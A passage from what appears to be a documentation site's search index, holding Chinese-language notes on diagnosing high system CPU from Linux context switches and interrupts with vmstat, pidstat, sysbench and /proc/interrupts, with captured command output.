\u6587\u4ef6\u6765\u5206\u6790\u5177\u4f53\u7684\u4e2d\u65ad\u7c7b\u578b\u3002","title":"\u4e0a\u4e0b\u6587\u5207\u6362\u5bfc\u81f4sys\u9ad8"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E5%AF%BC%E8%87%B4sys%E9%AB%98/#sys","text":"","title":"\u9891\u7e41\u4e0a\u4e0b\u6587\u5207\u6362\u5bfc\u81f4sys\u9ad8"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E5%AF%BC%E8%87%B4sys%E9%AB%98/#_1","text":"CPU \u4e0a\u4e0b\u6587\u5207\u6362\u662f\u4fdd\u8bc1 Linux \u7cfb\u7edf\u6b63\u5e38\u5de5\u4f5c\u7684\u4e00\u4e2a\u6838\u5fc3\u529f\u80fd\uff0c\u6309\u7167\u4e0d\u540c\u573a\u666f\uff0c\u53ef\u4ee5\u5206\u4e3a\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u5207\u6362\u3001\u7ebf\u7a0b\u4e0a\u4e0b\u6587\u5207\u6362\u548c\u4e2d\u65ad\u4e0a\u4e0b\u6587\u5207\u6362\u3002 vmstat \u662f\u4e00\u4e2a\u5e38\u7528\u7684\u7cfb\u7edf\u6027\u80fd\u5206\u6790\u5de5\u5177\uff0c\u4e3b\u8981\u7528\u6765\u5206\u6790\u7cfb\u7edf\u7684\u5185\u5b58\u4f7f\u7528\u60c5\u51b5\uff0c\u4e5f\u5e38\u7528\u6765\u5206\u6790 CPU \u4e0a\u4e0b\u6587\u5207\u6362\u548c\u4e2d\u65ad\u7684\u6b21\u6570\u3002 \u6bd4\u5982\uff0c\u4e0b\u9762\u5c31\u662f\u4e00\u4e2a vmstat \u7684\u4f7f\u7528\u793a\u4f8b\uff1a # \u6bcf\u96945\u79d2\u8f93\u51fa1\u7ec4\u6570\u636e $ vmstat 5 procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 0 0 0 7005360 91564 818900 0 0 0 0 25 33 0 0 100 0 0 \u6211\u4eec\u4e00\u8d77\u6765\u770b\u8fd9\u4e2a\u7ed3\u679c\uff0c\u4f60\u53ef\u4ee5\u5148\u8bd5\u7740\u81ea\u5df1\u89e3\u8bfb\u6bcf\u5217\u7684\u542b\u4e49\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u91cd\u70b9\u5f3a\u8c03\u4e0b\uff0c\u9700\u8981\u7279\u522b\u5173\u6ce8\u7684\u56db\u5217\u5185\u5bb9\uff1a cs\uff08context switch\uff09\u662f\u6bcf\u79d2\u4e0a\u4e0b\u6587\u5207\u6362\u7684\u6b21\u6570\u3002 in\uff08interrupt\uff09\u5219\u662f\u6bcf\u79d2\u4e2d\u65ad\u7684\u6b21\u6570\u3002 r\uff08Running or Runnable\uff09\u662f\u5c31\u7eea\u961f\u5217\u7684\u957f\u5ea6\uff0c\u4e5f\u5c31\u662f\u6b63\u5728\u8fd0\u884c\u548c\u7b49\u5f85 CPU \u7684\u8fdb\u7a0b\u6570\u3002 b\uff08Blocked\uff09\u5219\u662f\u5904\u4e8e\u4e0d\u53ef\u4e2d\u65ad\u7761\u7720\u72b6\u6001\u7684\u8fdb\u7a0b\u6570\u3002 \u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\u7684\u4e0a\u4e0b\u6587\u5207\u6362\u6b21\u6570 cs \u662f 33 \u6b21\uff0c\u800c\u7cfb\u7edf\u4e2d\u65ad\u6b21\u6570 in \u5219\u662f 25 \u6b21\uff0c\u800c\u5c31\u7eea\u961f\u5217\u957f\u5ea6 r \u548c\u4e0d\u53ef\u4e2d\u65ad\u72b6\u6001\u8fdb\u7a0b\u6570 b \u90fd\u662f 0\u3002 vmstat \u53ea\u7ed9\u51fa\u4e86\u7cfb\u7edf\u603b\u4f53\u7684\u4e0a\u4e0b\u6587\u5207\u6362\u60c5\u51b5\uff0c\u8981\u60f3\u67e5\u770b\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u8be6\u7ec6\u60c5\u51b5\uff0c\u5c31\u9700\u8981\u4f7f\u7528\u6211\u4eec\u524d\u9762\u63d0\u5230\u8fc7\u7684 pidstat \u4e86\u3002\u7ed9\u5b83\u52a0\u4e0a -w \u9009\u9879\uff0c\u4f60\u5c31\u53ef\u4ee5\u67e5\u770b\u6bcf\u4e2a\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u5207\u6362\u7684\u60c5\u51b5\u4e86\u3002 \u6bd4\u5982\u8bf4\uff1a # \u6bcf\u96945\u79d2\u8f93\u51fa1\u7ec4\u6570\u636e $ pidstat -w 5 Linux 4.15.0 (ubuntu) 09/23/18 _x86_64_ (2 CPU) 08:18:26 UID PID cswch/s nvcswch/s Command 08:18:31 0 1 0.20 0.00 systemd 08:18:31 0 8 5.40 0.00 rcu_sched ... \u8fd9\u4e2a\u7ed3\u679c\u4e2d\u6709\u4e24\u5217\u5185\u5bb9\u662f\u91cd\u70b9\u5173\u6ce8\u5bf9\u8c61\u3002\u4e00\u4e2a\u662f cswch \uff0c\u8868\u793a\u6bcf\u79d2\u81ea\u613f\u4e0a\u4e0b\u6587\u5207\u6362\uff08voluntary context switches\uff09\u7684\u6b21\u6570\uff0c\u53e6\u4e00\u4e2a\u5219\u662f nvcswch \uff0c\u8868\u793a\u6bcf\u79d2\u975e\u81ea\u613f\u4e0a\u4e0b\u6587\u5207\u6362\uff08non voluntary context switches\uff09\u7684\u6b21\u6570\u3002 \u8fd9\u4e24\u4e2a\u6982\u5ff5\u4e00\u5b9a\u8981\u7262\u7262\u8bb0\u4f4f\uff0c\u56e0\u4e3a\u5b83\u4eec\u610f\u5473\u7740\u4e0d\u540c\u7684\u6027\u80fd\u95ee\u9898\uff1a \u6240\u8c13\u81ea\u613f\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u662f\u6307\u8fdb\u7a0b\u65e0\u6cd5\u83b7\u53d6\u6240\u9700\u8d44\u6e90\uff0c\u5bfc\u81f4\u7684\u4e0a\u4e0b\u6587\u5207\u6362\u3002\u6bd4\u5982\u8bf4\uff0c I/O\u3001\u5185\u5b58\u7b49\u7cfb\u7edf\u8d44\u6e90\u4e0d\u8db3\u65f6\uff0c\u5c31\u4f1a\u53d1\u751f\u81ea\u613f\u4e0a\u4e0b\u6587\u5207\u6362\u3002 \u800c\u975e\u81ea\u613f\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u5219\u662f\u6307\u8fdb\u7a0b\u7531\u4e8e\u65f6\u95f4\u7247\u5df2\u5230\u7b49\u539f\u56e0\uff0c\u88ab\u7cfb\u7edf\u5f3a\u5236\u8c03\u5ea6\uff0c\u8fdb\u800c\u53d1\u751f\u7684\u4e0a\u4e0b\u6587\u5207\u6362\u3002\u6bd4\u5982\u8bf4\uff0c\u5927\u91cf\u8fdb\u7a0b\u90fd\u5728\u4e89\u62a2 CPU \u65f6\uff0c\u5c31\u5bb9\u6613\u53d1\u751f\u975e\u81ea\u613f\u4e0a\u4e0b\u6587\u5207\u6362\u3002","title":"\u524d\u8a00"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E5%AF%BC%E8%87%B4sys%E9%AB%98/#sysbench","text":"\u673a\u5668\u914d\u7f6e\uff1a4 CPU\uff0c8GB \u5185\u5b58 \u9884\u5148\u5b89\u88c5 sysbench \u548c sysstat \u5305\uff0c yum install sysbench sysstat \u7ec8\u7aef1\uff1a # \u4ee510\u4e2a\u7ebf\u7a0b\u8fd0\u884c5\u5206\u949f\u7684\u57fa\u51c6\u6d4b\u8bd5\uff0c\u6a21\u62df\u591a\u7ebf\u7a0b\u5207\u6362\u7684\u95ee\u9898 [root@centos ~]# sysbench --threads=10 --max-time=300 threads run \u7ec8\u7aef2\uff1a [root@centos ~]# vmstat -wt 1 procs -----------------------memory---------------------- ---swap-- -----io---- -system-- --------cpu-------- -----timestamp----- r b swpd free buff cache si so bi bo in cs us sy id wa st CST 0 0 0 5903872 257528 1504408 0 0 0 12 1588 3094 0 0 100 0 0 2022-05-20 03:24:36 0 0 0 5903872 257528 1504408 0 0 0 0 1543 2985 0 0 100 0 0 2022-05-20 03:24:37 5 0 0 5902564 257528 1504408 0 0 0 0 15689 229995 6 12 82 0 0 2022-05-20 03:24:38 4 0 0 5902200 257528 1504408 0 0 0 0 39276 959684 35 57 8 0 0 2022-05-20 03:24:39 4 0 0 5902200 257528 1504408 0 0 0 0 40576 1106457 34 57 9 0 0 2022-05-20 03:24:40 4 0 0 5902200 257528 1504408 0 0 0 0 39332 1016539 35 57 9 0 0 2022-05-20 03:24:41 6 0 0 5902200 257528 1504408 0 0 0 12 40197 980060 35 56 9 0 0 2022-05-20 03:24:42 7 0 0 5902200 257528 1504408 0 0 0 0 39096 1054514 36 56 9 0 0 2022-05-20 03:24:43 6 0 0 5902200 257528 1504408 0 0 0 0 38769 1049458 35 57 9 0 0 2022-05-20 03:24:44 6 0 0 5902200 257528 1504408 0 0 0 0 34921 972992 36 56 8 0 0 2022-05-20 03:24:45 \u4f60\u5e94\u8be5\u53ef\u4ee5\u53d1\u73b0\uff0ccs \u5217\u7684\u4e0a\u4e0b\u6587\u5207\u6362\u6b21\u6570\u4ece\u4e4b\u524d\u7684 2000\u591a \u9aa4\u7136\u4e0a\u5347\u5230\u4e86 110 \u4e07\u3002 \u540c\u65f6\uff0c\u6ce8\u610f\u89c2\u5bdf\u5176\u4ed6\u51e0\u4e2a\u6307\u6807\uff1a r \u5217\uff1a\u5c31\u7eea\u961f\u5217\u7684\u957f\u5ea6\u5df2\u7ecf\u5230\u4e86 7\uff0c\u8fdc\u8fdc\u8d85\u8fc7\u4e86\u7cfb\u7edf CPU \u7684\u4e2a\u6570 4\uff0c\u6240\u4ee5\u80af\u5b9a\u4f1a\u6709\u5927\u91cf\u7684 CPU \u7ade\u4e89\u3002 us\uff08user\uff09\u548c sy\uff08system\uff09\u5217\uff1a\u8fd9\u4e24\u5217\u7684 CPU \u4f7f\u7528\u7387\u52a0\u8d77\u6765\u4e0a\u5347\u5230\u4e86 99%\uff0c\u5176\u4e2d\u7cfb\u7edf CPU \u4f7f\u7528\u7387\uff0c\u4e5f\u5c31\u662f sy \u5217\u9ad8\u8fbe 57%\uff0c\u8bf4\u660e CPU \u4e3b\u8981\u662f\u88ab\u5185\u6838\u5360\u7528\u4e86\u3002 in \u5217\uff1a\u4e2d\u65ad\u6b21\u6570\u4e5f\u4e0a\u5347\u5230\u4e86 4 \u4e07\u5de6\u53f3\uff0c\u8bf4\u660e\u4e2d\u65ad\u5904\u7406\u4e5f\u662f\u4e2a\u6f5c\u5728\u7684\u95ee\u9898\u3002\u7efc\u5408\u8fd9\u51e0\u4e2a\u6307\u6807\uff0c\u7cfb\u7edf\u7684\u5c31\u7eea\u961f\u5217\u8fc7\u957f\uff0c\u4e5f\u5c31\u662f\u6b63\u5728\u8fd0\u884c\u548c\u7b49\u5f85 CPU \u7684\u8fdb\u7a0b\u6570\u8fc7\u591a\uff0c\u5bfc\u81f4\u4e86\u5927\u91cf\u7684\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u800c\u4e0a\u4e0b\u6587\u5207\u6362\u53c8\u5bfc\u81f4\u4e86\u7cfb\u7edf CPU \u7684\u5360\u7528\u7387\u5347\u9ad8\u3002\u90a3\u4e48\u5230\u5e95\u662f\u4ec0\u4e48\u8fdb\u7a0b\u5bfc\u81f4\u4e86\u8fd9\u4e9b\u95ee\u9898\u5462\uff1f \u7ec8\u7aef3\uff1a $ pidstat -w -u -t 1 Average: UID TGID TID %usr %system %guest %CPU CPU Command Average: 0 1188 - 0.30 0.60 0.00 0.90 - rshim Average: 0 - 1188 0.30 0.60 0.00 0.90 - |__rshim Average: 0 8916 - 0.20 0.30 0.00 0.50 - YDService Average: 0 - 8919 0.00 0.10 0.00 0.10 - |__YDService Average: 0 - 24019 0.10 0.00 0.00 0.10 - |__YDService Average: 0 8926 - 0.00 0.10 0.00 0.10 - YDLive Average: 0 28048 - 0.00 0.10 0.00 0.10 - kworker/3:1 Average: 0 - 28048 0.00 0.10 0.00 0.10 - |__kworker/3:1 Average: 0 28408 - 100.00 100.00 0.00 100.00 - sysbench Average: 0 - 28409 14.49 24.28 0.00 38.76 - |__sysbench Average: 0 - 28410 14.79 23.88 0.00 38.66 - |__sysbench Average: 0 - 28411 14.99 23.78 0.00 38.76 - |__sysbench Average: 0 - 28412 14.39 22.48 0.00 36.86 - |__sysbench Average: 0 - 28413 14.39 23.58 0.00 37.96 - |__sysbench Average: 0 - 28414 14.29 23.88 0.00 38.16 - |__sysbench Average: 0 - 28415 14.89 23.88 0.00 38.76 - |__sysbench Average: 0 - 28416 14.29 24.38 0.00 38.66 - |__sysbench Average: 0 - 28417 13.99 23.28 0.00 37.26 - |__sysbench Average: 0 - 28418 15.18 24.18 0.00 39.36 - |__sysbench Average: 0 28432 - 0.40 0.90 0.00 1.30 - pidstat Average: 0 - 28432 0.40 0.90 0.00 1.30 - |__pidstat Average: UID TGID TID cswch/s nvcswch/s Command Average: 0 6 - 4.70 0.00 ksoftirqd/0 Average: 0 - 6 4.70 0.00 |__ksoftirqd/0 Average: 0 9 - 15.08 0.00 rcu_sched Average: 0 - 9 15.08 0.00 |__rcu_sched Average: 0 - 28048 3.40 0.00 |__kworker/3:1 Average: 0 28184 - 0.10 0.00 bash Average: 0 - 28184 0.10 0.00 |__bash Average: 89 28341 - 0.10 0.00 pickup Average: 89 - 28341 0.10 0.00 |__pickup Average: 0 28405 - 0.50 0.00 kworker/3:0 Average: 0 - 28405 0.50 0.00 |__kworker/3:0 Average: 0 - 28409 25990.21 65447.15 |__sysbench Average: 0 - 28410 25781.02 66814.89 |__sysbench Average: 0 - 28411 25511.19 64601.10 |__sysbench Average: 0 - 28412 26991.11 62141.86 |__sysbench Average: 0 - 28413 26430.07 65891.11 |__sysbench Average: 0 - 28414 26558.14 64489.21 |__sysbench Average: 0 - 28415 26396.90 63810.69 |__sysbench Average: 0 - 28416 26074.23 63148.05 |__sysbench Average: 0 - 28417 26524.78 67813.79 |__sysbench Average: 0 - 28418 25621.38 69440.06 |__sysbench Average: 0 28432 - 1.00 0.90 pidstat Average: 0 - 28432 1.00 0.90 |__pidstat \u4ece pidstat \u7684\u8f93\u51fa\u4f60\u53ef\u4ee5\u53d1\u73b0\uff0cCPU \u4f7f\u7528\u7387\u7684\u5347\u9ad8\u679c\u7136\u662f sysbench \u5bfc\u81f4\u7684\uff0c\u5b83\u7684 CPU \u4f7f\u7528\u7387\u5df2\u7ecf\u8fbe\u5230\u4e86 100%\u3002\u4e0a\u4e0b\u6587\u5207\u6362\u7f6a\u9b41\u7978\u9996\uff0c\u8fd8\u662f\u8fc7\u591a\u7684 sysbench \u7ebf\u7a0b\u3002 \u7ec8\u7aef4\uff1a [root@VM-0-16-centos ~]# watch -n 1 -d cat /proc/interrupts Every 1.0s: cat /proc/interrupts Fri May 20 04:03:32 2022 CPU0 CPU1 CPU2 CPU3 0: 88 0 0 0 IO-APIC-edge timer 1: 10 0 0 0 IO-APIC-edge i8042 4: 387 0 0 0 IO-APIC-edge serial 6: 3 0 0 0 IO-APIC-edge floppy 8: 0 0 0 0 IO-APIC-edge rtc0 9: 0 0 0 0 IO-APIC-fasteoi acpi 11: 0 0 0 0 IO-APIC-fasteoi uhci_hcd:usb1, virtio3 12: 15 0 0 0 IO-APIC-edge i8042 14: 5016380 0 0 0 IO-APIC-edge ata_piix 15: 0 0 0 0 IO-APIC-edge ata_piix 24: 0 0 0 0 PCI-MSI-edge virtio1-config 25: 2810303 0 0 0 PCI-MSI-edge virtio1-req.0 26: 10 0 0 0 PCI-MSI-edge virtio0-config 27: 4356739 0 0 0 PCI-MSI-edge virtio0-input.0 28: 1 0 0 0 PCI-MSI-edge virtio0-output.0 29: 1 1136553 0 0 PCI-MSI-edge virtio0-input.1 30: 1 0 0 0 PCI-MSI-edge virtio0-output.1 31: 0 0 0 0 PCI-MSI-edge virtio2-config 32: 343 0 0 0 PCI-MSI-edge virtio2-req.0 NMI: 0 0 0 0 Non-maskable interrupts LOC: 1782951044 1786075743 1867019728 1796389760 Local timer interrupts SPU: 0 0 0 0 Spurious interrupts PMI: 0 0 0 0 Performance monitoring interrupts IWI: 1957371 1944591 1726299 1928079 IRQ work interrupts RTR: 0 0 0 0 APIC ICR read retries RES: 201178492 201387163 198141978 204827265 Rescheduling interrupts CAL: 157144 725105 2071436 2165417 Function call interrupts TLB: 2732341 2720775 2684270 2657260 TLB shootdowns TRM: 0 0 0 0 Thermal event interrupts THR: 0 0 0 0 Threshold APIC interrupts DFR: 0 0 0 0 Deferred Error APIC interrupts MCE: 0 0 0 0 Machine check exceptions MCP: 17122 17122 17122 17122 Machine check polls ERR: 0 MIS: 0 PIN: 0 0 0 0 Posted-interrupt notification event NPI: 0 0 0 0 Nested posted-interrupt event PIW: 0 0 0 0 Posted-interrupt wakeup event \u524d\u9762\u5728\u89c2\u5bdf\u7cfb\u7edf\u6307\u6807\u65f6\uff0c\u9664\u4e86\u4e0a\u4e0b\u6587\u5207\u6362\u9891\u7387\u9aa4\u7136\u5347\u9ad8\uff0c\u8fd8\u6709\u4e00\u4e2a\u6307\u6807\u4e5f\u6709\u5f88\u5927\u7684\u53d8\u5316\u3002\u662f\u7684\uff0c\u6b63\u662f\u4e2d\u65ad\u6b21\u6570\u3002\u4e2d\u65ad\u6b21\u6570\u4e5f\u4e0a\u5347\u5230\u4e86 4 \u4e07\uff0c\u4f46\u5230\u5e95\u662f\u4ec0\u4e48\u7c7b\u578b\u7684\u4e2d\u65ad\u4e0a\u5347\u4e86\u3002\u65e2\u7136\u662f\u4e2d\u65ad\uff0c\u5b83\u53ea\u53d1\u751f\u5728\u5185\u6838\u6001\uff0c\u800c pidstat \u53ea\u662f\u4e00\u4e2a\u8fdb\u7a0b\u7684\u6027\u80fd\u5206\u6790\u5de5\u5177\uff0c\u5e76\u4e0d\u63d0\u4f9b\u4efb\u4f55\u5173\u4e8e\u4e2d\u65ad\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u600e\u6837\u624d\u80fd\u77e5\u9053\u4e2d\u65ad\u53d1\u751f\u7684\u7c7b\u578b\u5462\uff1f\u90a3\u5c31\u662f\u4ece /proc/interrupts \u8fd9\u4e2a\u53ea\u8bfb\u6587\u4ef6\u4e2d\u8bfb\u53d6\u3002/proc \u5b9e\u9645\u4e0a\u662f Linux \u7684\u4e00\u4e2a\u865a\u62df\u6587\u4ef6\u7cfb\u7edf\uff0c\u7528\u4e8e\u5185\u6838\u7a7a\u95f4\u4e0e\u7528\u6237\u7a7a\u95f4\u4e4b\u95f4\u7684\u901a\u4fe1\u3002/proc/interrupts \u5c31\u662f\u8fd9\u79cd\u901a\u4fe1\u673a\u5236\u7684\u4e00\u90e8\u5206\uff0c\u63d0\u4f9b\u4e86\u4e00\u4e2a\u53ea\u8bfb\u7684\u4e2d\u65ad\u4f7f\u7528\u60c5\u51b5\u3002 \u89c2\u5bdf\u4e00\u6bb5\u65f6\u95f4\uff0c\u4f60\u53ef\u4ee5\u53d1\u73b0\uff0c\u53d8\u5316\u901f\u5ea6\u6700\u5feb\u7684\u662f\u91cd\u8c03\u5ea6\u4e2d\u65ad\uff08RES\uff09\uff0c\u8fd9\u4e2a\u4e2d\u65ad\u7c7b\u578b\u8868\u793a\uff0c\u5524\u9192\u7a7a\u95f2\u72b6\u6001\u7684 CPU \u6765\u8c03\u5ea6\u65b0\u7684\u4efb\u52a1\u8fd0\u884c\u3002\u8fd9\u662f\u591a\u5904\u7406\u5668\u7cfb\u7edf\uff08SMP\uff09\u4e2d\uff0c\u8c03\u5ea6\u5668\u7528\u6765\u5206\u6563\u4efb\u52a1\u5230\u4e0d\u540c CPU \u7684\u673a\u5236\uff0c\u901a\u5e38\u4e5f\u88ab\u79f0\u4e3a\u5904\u7406\u5668\u95f4\u4e2d\u65ad\uff08Inter-Processor Interrupts\uff0cIPI\uff09\u3002\u6240\u4ee5\uff0c\u8fd9\u91cc\u7684\u4e2d\u65ad\u5347\u9ad8\u8fd8\u662f\u56e0\u4e3a\u8fc7\u591a\u4efb\u52a1\u7684\u8c03\u5ea6\u95ee\u9898\uff0c\u8ddf\u524d\u9762\u4e0a\u4e0b\u6587\u5207\u6362\u6b21\u6570\u7684\u5206\u6790\u7ed3\u679c\u662f\u4e00\u81f4\u7684\u3002 \u7ec8\u7aef5\uff1a [root@VM-0-16-centos ~]# cat /proc/interrupts ; sleep 1s ;cat /proc/interrupts CPU0 CPU1 CPU2 CPU3 0: 88 0 0 0 IO-APIC-edge timer 1: 10 0 0 0 IO-APIC-edge i8042 4: 387 0 0 0 IO-APIC-edge serial 6: 3 0 0 0 IO-APIC-edge floppy 8: 0 0 0 0 IO-APIC-edge rtc0 9: 0 0 0 0 IO-APIC-fasteoi acpi 11: 0 0 0 0 IO-APIC-fasteoi uhci_hcd:usb1, virtio3 12: 15 0 0 0 IO-APIC-edge i8042 14: 5016252 0 0 0 IO-APIC-edge ata_piix 15: 0 0 0 0 IO-APIC-edge ata_piix 24: 0 0 0 0 PCI-MSI-edge virtio1-config 25: 2810206 0 0 0 PCI-MSI-edge virtio1-req.0 26: 10 0 0 0 PCI-MSI-edge virtio0-config 27: 4356352 0 0 0 PCI-MSI-edge virtio0-input.0 28: 1 0 0 0 PCI-MSI-edge virtio0-output.0 29: 1 1136531 0 0 PCI-MSI-edge virtio0-input.1 30: 1 0 0 0 PCI-MSI-edge virtio0-output.1 31: 0 0 0 0 PCI-MSI-edge virtio2-config 32: 343 0 0 0 PCI-MSI-edge virtio2-req.0 NMI: 0 0 0 0 Non-maskable interrupts LOC: 1782787996 1785909076 1866856961 1796226528 Local timer interrupts SPU: 0 0 0 0 Spurious interrupts PMI: 0 0 0 0 Performance monitoring interrupts IWI: 1957329 1944532 1726246 1928026 IRQ work interrupts RTR: 0 0 0 0 APIC ICR read retries RES: 199987693 200087749 197045111 203640135 Rescheduling interrupts CAL: 157140 725022 2071329 2165308 Function call interrupts TLB: 2732319 2720756 2684264 2657244 TLB shootdowns TRM: 0 0 0 0 Thermal event interrupts THR: 0 0 0 0 Threshold APIC interrupts DFR: 0 0 0 0 Deferred Error APIC interrupts MCE: 0 0 0 0 Machine check exceptions MCP: 17122 17122 17122 17122 Machine check polls ERR: 0 MIS: 0 PIN: 0 0 0 0 Posted-interrupt notification event NPI: 0 0 0 0 Nested posted-interrupt event PIW: 0 0 0 0 Posted-interrupt wakeup event CPU0 CPU1 CPU2 CPU3 0: 88 0 0 0 IO-APIC-edge timer 1: 10 0 0 0 IO-APIC-edge i8042 4: 387 0 0 0 IO-APIC-edge serial 6: 3 0 0 0 IO-APIC-edge floppy 8: 0 0 0 0 IO-APIC-edge rtc0 9: 0 0 0 0 IO-APIC-fasteoi acpi 11: 0 0 0 0 IO-APIC-fasteoi uhci_hcd:usb1, virtio3 12: 15 0 0 0 IO-APIC-edge i8042 14: 5016254 0 0 0 IO-APIC-edge ata_piix 15: 0 0 0 0 IO-APIC-edge ata_piix 24: 0 0 0 0 PCI-MSI-edge virtio1-config 25: 2810206 0 0 0 PCI-MSI-edge virtio1-req.0 26: 10 0 0 0 PCI-MSI-edge virtio0-config 27: 4356355 0 0 0 PCI-MSI-edge virtio0-input.0 28: 1 0 0 0 PCI-MSI-edge virtio0-output.0 29: 1 1136531 0 0 PCI-MSI-edge virtio0-input.1 30: 1 0 0 0 PCI-MSI-edge virtio0-output.1 31: 0 0 0 0 PCI-MSI-edge virtio2-config 32: 343 0 0 0 PCI-MSI-edge virtio2-req.0 NMI: 0 0 0 0 Non-maskable interrupts LOC: 1782789324 1785910399 1866858200 1796227706 Local timer interrupts SPU: 0 0 0 0 Spurious interrupts PMI: 0 0 0 0 Performance monitoring interrupts IWI: 1957329 1944533 1726247 1928026 IRQ work interrupts RTR: 0 0 0 0 APIC ICR read retries RES: 199997549 200099900 197051402 203648151 Rescheduling interrupts CAL: 157140 725022 2071329 2165308 Function call interrupts TLB: 2732319 2720756 2684264 2657244 TLB shootdowns TRM: 0 0 0 0 Thermal event interrupts THR: 0 0 0 0 Threshold APIC interrupts DFR: 0 0 0 0 Deferred Error APIC interrupts MCE: 0 0 0 0 Machine check exceptions MCP: 17122 17122 17122 17122 Machine check polls ERR: 0 MIS: 0 PIN: 0 0 0 0 Posted-interrupt notification event NPI: 0 0 0 0 Nested posted-interrupt event PIW: 0 0 0 0 Posted-interrupt wakeup event \u4ece1\u79d2\u949f\u7684\u6570\u91cf\u53d8\u5316\u6765\u8ba1\u7b97\uff0cRES\u57284\u4e2aCPU\u4e2d\u65ad\u6b21\u6570\u53d8\u5316\u5dee \u7684\u603b\u548c \u5dee\u4e0d\u591a\u662f 4W \u6240\u4ee5\uff0c\u8fd9\u91cc\u7684\u4e2d\u65ad\u5347\u9ad8\u8fd8\u662f\u56e0\u4e3a\u8fc7\u591a\u4efb\u52a1\u7684\u8c03\u5ea6\u95ee\u9898\uff0c\u8ddf\u524d\u9762\u4e0a\u4e0b\u6587\u5207\u6362\u6b21\u6570\u7684\u5206\u6790\u7ed3\u679c\u662f\u4e00\u81f4\u7684\u3002 \u81ea\u613f\u4e0a\u4e0b\u6587\u5207\u6362\u53d8\u591a\u4e86\uff0c\u8bf4\u660e\u8fdb\u7a0b\u90fd\u5728\u7b49\u5f85\u8d44\u6e90\uff0c\u6709\u53ef\u80fd\u53d1\u751f\u4e86 I/O \u7b49\u5176\u4ed6\u95ee\u9898\uff1b \u975e\u81ea\u613f\u4e0a\u4e0b\u6587\u5207\u6362\u53d8\u591a\u4e86\uff0c\u8bf4\u660e\u8fdb\u7a0b\u90fd\u5728\u88ab\u5f3a\u5236\u8c03\u5ea6\uff0c\u4e5f\u5c31\u662f\u90fd\u5728\u4e89\u62a2 CPU\uff0c\u8bf4\u660e CPU \u7684\u786e\u6210\u4e86\u74f6\u9888\uff1b \u4e2d\u65ad\u6b21\u6570\u53d8\u591a\u4e86\uff0c\u8bf4\u660e CPU \u88ab\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u5360\u7528\uff0c\u8fd8\u9700\u8981\u901a\u8fc7\u67e5\u770b /proc/interrupts \u6587\u4ef6\u6765\u5206\u6790\u5177\u4f53\u7684\u4e2d\u65ad\u7c7b\u578b\u3002","title":"\u4f7f\u7528 sysbench \u6765\u6a21\u62df\u7cfb\u7edf\u591a\u7ebf\u7a0b\u8c03\u5ea6\u5207\u6362\u7684\u60c5\u51b5"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E4%B8%AD%E6%96%AD/","text":"Linux\u7684\u4e2d\u65ad Linux \u5c06\u4e2d\u65ad\u5904\u7406\u8fc7\u7a0b\u5206\u6210\u4e86\u4e24\u4e2a\u9636\u6bb5\uff0c\u4e5f\u5c31\u662f\u4e0a\u534a\u90e8\u548c\u4e0b\u534a\u90e8\uff1a \u4e0a\u534a\u90e8\u7528\u6765\u5feb\u901f\u5904\u7406\u4e2d\u65ad\uff0c\u5b83\u5728\u4e2d\u65ad\u7981\u6b62\u6a21\u5f0f\u4e0b\u8fd0\u884c\uff0c\u4e3b\u8981\u5904\u7406\u8ddf\u786c\u4ef6\u7d27\u5bc6\u76f8\u5173\u7684\u6216\u65f6\u95f4\u654f\u611f\u7684\u5de5\u4f5c\u3002 \u4e0b\u534a\u90e8\u7528\u6765\u5ef6\u8fdf\u5904\u7406\u4e0a\u534a\u90e8\u672a\u5b8c\u6210\u7684\u5de5\u4f5c\uff0c\u901a\u5e38\u4ee5\u5185\u6838\u7ebf\u7a0b\u7684\u65b9\u5f0f\u8fd0\u884c\u3002 \u7f51\u5361\u63a5\u6536\u5230\u6570\u636e\u5305\u540e\uff0c\u4f1a\u901a\u8fc7\u786c\u4ef6\u4e2d\u65ad\u7684\u65b9\u5f0f\uff0c\u901a\u77e5\u5185\u6838\u6709\u65b0\u7684\u6570\u636e\u5230\u4e86\u3002\u8fd9\u65f6\uff0c\u5185\u6838\u5c31\u5e94\u8be5\u8c03\u7528\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u6765\u54cd\u5e94\u5b83\u3002 \u5bf9\u4e0a\u534a\u90e8\u6765\u8bf4\uff0c\u65e2\u7136\u662f\u5feb\u901f\u5904\u7406\uff0c\u5176\u5b9e\u5c31\u662f\u8981\u628a\u7f51\u5361\u7684\u6570\u636e\u8bfb\u5230\u5185\u5b58\u4e2d\uff0c\u7136\u540e\u66f4\u65b0\u4e00\u4e0b\u786c\u4ef6\u5bc4\u5b58\u5668\u7684\u72b6\u6001\uff08\u8868\u793a\u6570\u636e\u5df2\u7ecf\u8bfb\u597d\u4e86\uff09\uff0c\u6700\u540e\u518d\u53d1\u9001\u4e00\u4e2a\u8f6f\u4e2d\u65ad\u4fe1\u53f7\uff0c\u901a\u77e5\u4e0b\u534a\u90e8\u505a\u8fdb\u4e00\u6b65\u7684\u5904\u7406\u3002 